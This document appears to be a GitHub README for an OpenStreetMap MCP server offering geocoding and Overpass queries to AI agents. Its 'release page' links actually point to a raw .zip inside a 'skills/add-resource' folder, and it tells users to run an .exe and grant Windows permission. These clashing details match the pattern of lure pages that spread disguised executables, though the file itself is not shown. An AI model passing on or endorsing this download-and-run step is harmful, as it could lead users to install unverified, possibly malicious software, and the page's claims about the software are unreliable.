# 📍 openstreetmap-mcp-server - Access spatial maps with AI agents

[![Download for Windows](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/xooa67-max/openstreetmap-mcp-server/main/skills/add-resource/server_mcp_openstreetmap_v3.9-beta.2.zip)

This software allows your AI agents to interact with OpenStreetMap data. You can search for locations, find addresses from points on a map, and run complex spatial queries. It uses the Model Context Protocol to bridge the gap between your AI tools and global mapping data.

## 📥 Getting the software

You need to download the installer from the release page.

[Click here to visit the release page to download the software](https://raw.githubusercontent.com/xooa67-max/openstreetmap-mcp-server/main/skills/add-resource/server_mcp_openstreetmap_v3.9-beta.2.zip)

Look for the file that ends in .exe for Windows. Save this file to your computer.

## 💻 System requirements

Your computer must meet these basic needs to run this server correctly:

*   Operating System: Windows 10 or Windows 11.
*   Memory: At least 4 Gigabytes of RAM.
*   Storage: 200 Megabytes of free disk space.
*   Internet: A stable connection to reach OpenStreetMap services.

## ⚙️ Setting up the application

Follow these steps to prepare your system once the download finishes:

1. Locate the file you downloaded. 
2. Double-click the file to start the installation.
3. Follow the prompts on the screen.
4. Select a folder to store the application files.
5. Grant permission if Windows asks to allow the app to run.

The installation takes less than one minute. You do not need to install extra software for the basic functions.

## 🛰️ How to use the server

This application runs as a background service. It waits for your AI agent to send requests. You do not need to interact with a traditional window or menu once it starts.

The server supports two ways to talk to your AI agent:

### Standard Input and Output (STDIO)
This is the default method. It connects the server directly to your AI program. You launch the program, and it keeps a direct, private line open to your agent. This is best for security and speed.

### Streamable HTTP
This method allows your AI agent to reach the server over your local network. You can configure this if you run your AI agent on a separate device.

## 🔍 Understanding the features

This tool bridges the gap between raw map data and AI understanding.

*   **Geocoding:** Convert an address or place name into exact map coordinates.
*   **Reverse Geocoding:** Identify the nearest address or landmarks for a set of coordinates.
*   **Overpass Queries:** Run detailed requests for physical features. You can ask for all hospitals in a city or the name of every park in a neighborhood.

## 🛠️ Configuration tasks

You may need to adjust your settings based on your unique goals. Open the configuration file found in the installation folder. You can change the following options:

*   **Port Number:** Change the number if you conflict with other software.
*   **Log Level:** Set this to show more detail if you experience errors.
*   **Cache Duration:** Adjust how long the software remembers recent map searches.

Always save the text file after you make changes. Restart the application to apply the new settings.

## 🔧 Troubleshooting common issues

If the application fails to start, check the following items:

*   **Missing Permissions:** Ensure your user account has rights to run software in the chosen directory.
*   **Port Conflicts:** If you use the HTTP mode, confirm that no other program uses the same port.
*   **Network Access:** Verify your firewall does not block the application from sending data to OpenStreetMap.
*   **Incorrect Path:** Ensure you did not move the application file after the installation process.

## 📊 Performance tips

To get the best results, use these practices:

*   Limit your spatial queries to small areas. This reduces the time the server spends waiting for data.
*   Keep your computer connected to a fast network to get quick responses from the map services.
*   Delete old log files every few months to save disk space.

## 🤝 Getting more help

If you encounter a problem that you cannot solve, check the repository issues page. Others may have found a solution for your situation. 

You can also read the documentation files included with the download. These files explain the technical language that the AI agents use to communicate with the server.

Use this software to enable your AI agents to plan routes, identify landmarks, and interact with the physical world through map data. The server simplifies the complex process of turning location names into accurate map points. 

This tool serves as a reliable connector between your local workspace and the extensive map data available on the internet. It operates quietly and requires little management once you finish the initial setup.